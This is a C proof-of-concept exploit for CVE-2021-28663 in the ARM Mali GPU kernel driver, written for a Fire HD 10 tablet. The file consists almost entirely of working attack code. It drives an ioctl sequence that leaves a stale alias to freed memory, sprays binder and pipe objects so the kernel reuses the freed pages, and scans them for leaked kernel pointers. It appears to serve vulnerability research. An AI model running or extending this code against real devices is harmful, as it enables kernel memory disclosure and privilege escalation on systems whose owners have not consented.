/* CVE-2021-28663 trigger PoC v2 for Fire HD 10 2019 (trona)
 * kbase mali-r14p0, UAPI 11.11, 64-bit process, 2GB RAM.
 *
 * Init sequence required by this driver build:
 *   1. VERSION_CHECK
 *   2. SET_FLAGS(0x2)               -> sets kctx live flag (gates ioctls)
 *   3. mmap(BASE_MEM_MAP_TRACKING_HANDLE) -> binds kctx->mm
 *   4. MEM_ALLOC -> returns COOKIE address (pending region)
 *   5. mmap(cookie) -> establishes the real VA; that pointer is the alias handle
 *   6. MEM_ALIAS(real_va), MEM_FLAGS_CHANGE(DONT_NEED) on original
 *   7. mmap(alias) -> read stale pages, scan for kernel pointers
 */
#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/mman.h>

typedef unsigned int __u32;
typedef unsigned short __u16;
typedef unsigned long long __u64;

#include "mali_trona.h"

#define PAGE_SHIFT 12

int main(int argc, char **argv)
{
	unsigned long alloc_size = 32UL << 20; /* default 32MB */
	if (argc > 1) alloc_size = strtoul(argv[1], NULL, 0) << 20;

	struct kbase_ioctl_version_check vc = { .major = 999, .minor = 999 };
	int fd = open("/dev/mali0", O_RDWR);
	if (fd == -1) { perror("open mali0"); return 1; }

	if (ioctl(fd, KBASE_IOCTL_VERSION_CHECK, &vc) < 0) {
		perror("VERSION_CHECK"); return 1;
	}
	printf("[*] kbase UAPI %d.%d\n", vc.major, vc.minor);

	struct kbase_ioctl_set_flags sf;
	sf.create_flags = 0x2;
	if (ioctl(fd, KBASE_IOCTL_SET_FLAGS, &sf) < 0) { perror("SET_FLAGS"); return 1; }
	printf("[*] SET_FLAGS ok\n");

	void *track = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE,
			   MAP_SHARED, fd, BASE_MEM_MAP_TRACKING_HANDLE);
	if (track == MAP_FAILED) { perror("mmap tracking"); return 1; }
	printf("[*] tracking page mapped\n");

	union kbase_ioctl_mem_alloc mem_alloc;
	memset(&mem_alloc, 0, sizeof(mem_alloc));
	mem_alloc.in.va_pages     = alloc_size >> PAGE_SHIFT;
	mem_alloc.in.commit_pages = alloc_size >> PAGE_SHIFT;
	mem_alloc.in.flags = BASE_MEM_SAME_VA | BASE_MEM_PROT_CPU_RD |
			     BASE_MEM_PROT_CPU_WR | BASE_MEM_PROT_GPU_RD |
			     BASE_MEM_PROT_GPU_WR;

	if (ioctl(fd, KBASE_IOCTL_MEM_ALLOC, &mem_alloc) < 0) {
		perror("MEM_ALLOC"); return 1;
	}
	printf("[*] MEM_ALLOC ok, cookie va=0x%llx\n", mem_alloc.out.gpu_va);

	/* mmap the cookie -> establishes the real VA for the region */
	void *gpu_va = mmap(NULL, alloc_size, PROT_READ | PROT_WRITE,
			    MAP_SHARED, fd, mem_alloc.out.gpu_va);
	if (gpu_va == MAP_FAILED) { perror("mmap cookie"); return 1; }
	printf("[*] region mapped, real va = %p\n", gpu_va);

	memset(gpu_va, 0x42, alloc_size); /* fault in the backing pages */

	union kbase_ioctl_mem_alias mem_alias;
	struct base_mem_aliasing_info ai;
	memset(&mem_alias, 0, sizeof(mem_alias));
	memset(&ai, 0, sizeof(ai));

	mem_alias.in.nents  = 1;
	mem_alias.in.stride = alloc_size >> PAGE_SHIFT;
	mem_alias.in.flags  = BASE_MEM_PROT_GPU_RD | BASE_MEM_PROT_GPU_WR |
			      BASE_MEM_PROT_CPU_RD;
	ai.handle.basep.handle = (__u64)gpu_va;   /* real VA, not the cookie */
	ai.offset = 0;
	ai.length = alloc_size >> PAGE_SHIFT;
	mem_alias.in.aliasing_info = (__u64)&ai;

	if (ioctl(fd, KBASE_IOCTL_MEM_ALIAS, &mem_alias) < 0) {
		perror("MEM_ALIAS"); return 1;
	}
	printf("[*] MEM_ALIAS ok, alias va=0x%llx\n", mem_alias.out.gpu_va);

	struct kbase_ioctl_mem_flags_change fc;
	fc.gpu_va = (__u64)gpu_va;
	fc.mask   = BASE_MEM_FLAGS_MODIFIABLE | BASE_MEM_DONT_NEED;
	fc.flags  = BASE_MEM_FLAGS_MODIFIABLE | BASE_MEM_DONT_NEED;

	if (ioctl(fd, KBASE_IOCTL_MEM_FLAGS_CHANGE, &fc) < 0) {
		perror("MEM_FLAGS_CHANGE (DONT_NEED)");
		printf("[-] DONT_NEED rejected: bug not present as-is\n");
		return 1;
	}
	printf("[*] FLAGS_CHANGE(DONT_NEED) ok - driver accepted the trigger\n");

	void *alias_va = mmap(NULL, alloc_size, PROT_READ,
			      MAP_SHARED, fd, mem_alias.out.gpu_va);
	if (alias_va == MAP_FAILED) { perror("mmap alias"); return 1; }
	printf("[*] alias mapped at %p\n", alias_va);

	/* spray kernel objects so freed pages get reused */
	int bfds[200];
	for (int i = 0; i < 200; i++) bfds[i] = open("/dev/binder", O_RDWR);
	for (int i = 0; i < 100; i++) { int p[2]; pipe(p); }

	printf("[*] scanning stale alias for kernel pointers...\n");
	int found = 0;
	size_t n = alloc_size / 8;
	for (size_t i = 0; i < n; i++) {
		unsigned long v = *(volatile unsigned long *)((char *)alias_va + i * 8);
		if ((v >> 40) == 0xffffff) {
			printf("[+] leak: 0x%lx\n", v);
			if (++found >= 20) break;
		}
	}

	printf(found ? "[+] VULNERABLE: kernel pointers visible through stale alias\n"
		     : "[-] no kernel pointers found (patched, or pages not reused)\n");
	return found ? 0 : 2;
}
